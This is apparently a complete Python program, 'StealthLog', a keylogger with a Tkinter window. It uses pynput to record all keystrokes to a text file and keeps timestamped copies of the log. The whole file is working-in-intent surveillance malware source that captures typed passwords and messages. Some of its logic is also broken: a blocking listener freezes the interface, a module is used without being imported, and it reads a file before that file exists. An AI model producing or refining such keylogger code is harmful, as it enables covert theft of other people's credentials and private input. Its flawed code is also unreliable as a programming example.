import pynput
from pynput.keyboard import Key, Listener
import tkinter as tk
from tkinter import ttk
import os
from shutil import copyfile
from datetime import datetime

class StealthLog:
    def __init__(self, master):
        self.master = master
        self.keys = []
        self.log_file = tk.StringVar()
        self.current_log_file = "log.txt"
        self.last_saved_timestamp = None

        self.master.title("StealthLog - Keylogger Tool")

        self.log_label = ttk.Label(master, textvariable=self.log_file)
        self.log_label.pack()

        self.start_button = ttk.Button(master, text="Start", command=self.start)
        self.start_button.pack()

        self.stop_button = ttk.Button(master, text="Stop", state=tk.DISABLED, command=self.stop)
        self.stop_button.pack()

        self.save_location_button = ttk.Button(master, text="Change Save Location", command=self.change_save_location)
        self.save_location_button.pack()

        self.clear_log_button = ttk.Button(master, text="Clear Log", command=self.clear_log)
        self.clear_log_button.pack()

    def start(self):
        self.start_button.config(state=tk.DISABLED)
        self.stop_button.config(state=tk.NORMAL)

        self.log_file.set("")

        def on_press(key):
            self.keys.append(key)
            self.update_log()

        def on_release(key):
            if key == Key.esc:
                return False

        with Listener(on_press=on_press, on_release=on_release) as listener:
            listener.join()

    def stop(self):
        self.start_button.config(state=tk.NORMAL)
        self.stop_button.config(state=tk.DISABLED)

        # Save the log file with a new name and timestamp
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        backup_log = f"{self.current_log_file[:-4]}_{timestamp}.txt"
        copyfile(self.current_log_file, backup_log)

        with open(self.current_log_file, 'w') as f:
            for key in self.keys:
                if isinstance(key, Key):
                    continue
                f.write(str(key))
                f.write('\n')

        self.keys = []
        self.update_log()
        self.last_saved_timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")

    def update_log(self):
        with open(self.current_log_file, 'r') as f:
            log = f.read()
        self.log_file.set(log)

    def change_save_location(self):
        save_location = tk.filedialog.asksaveasfilename(defaultextension=".txt", filetypes=[("Text Files", "*.txt")])
        if save_location:
            self.current_log_file = save_location

    def clear_log(self):
        if self.last_saved_timestamp:
            os.remove(self.current_log_file)
            self.current_log_file = f"{self.current_log_file[:-4]}_{self.last_saved_timestamp}.txt"

        with open(self.current_log_file, 'w') as f:
            f.write("")

        self.keys = []
        self.update_log()

root = tk.Tk()
app = StealthLog(root)
root.mainloop()
